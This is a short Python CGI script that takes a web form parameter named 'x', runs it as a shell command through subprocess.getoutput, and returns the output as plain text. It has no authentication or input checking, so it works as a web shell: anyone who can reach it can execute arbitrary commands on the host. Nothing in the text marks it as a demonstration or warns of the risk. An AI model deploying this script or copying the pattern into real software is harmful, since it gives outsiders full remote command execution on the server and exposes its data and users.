#!/usr/bin/python3
import cgi
import subprocess

print("content-type: text/plain")
print()

form = cgi.FieldStorage()
cmd = form.getvalue("x")

output = subprocess.getoutput(cmd)
print(output)
